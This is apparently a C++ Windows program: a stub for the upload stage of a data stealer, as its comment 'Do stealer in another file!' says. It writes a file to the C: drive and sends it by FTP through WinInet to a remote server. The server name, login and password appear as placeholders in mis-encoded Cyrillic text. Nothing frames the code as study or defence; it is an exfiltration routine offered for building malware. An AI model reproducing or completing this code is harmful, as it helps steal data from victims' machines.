#include <Windows.h>
#include <WinInet.h>
#include <fstream>

#pragma comment (lib, "wininet.lib")

using namespace std;

int a;

// Do stealer in another file!





void createFile()
{
    ofstream upload ("C:\\Shit.txt");
    upload << ("Shit") << endl;
    upload.close();
}

void FTP()
{
    HINTERNET hInternet;
    HINTERNET hFtpSession;
    hInternet = InternetOpen(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    hFtpSession = InternetConnect(hInternet, L"ÑÀÉÒ", INTERNET_DEFAULT_FTP_PORT, L"ËÎÃÈÍ", L"ÏÀÐÎËÜ", INTERNET_SERVICE_FTP, 0, 0);
    FtpPutFile(hFtpSession, L"C:\\Shit.txt", L"//Shit", FTP_TRANSFER_TYPE_ASCII, 0);
    InternetCloseHandle(hFtpSession);
    InternetCloseHandle(hInternet);

}

int main()
{
    createFile();
    FTP();
}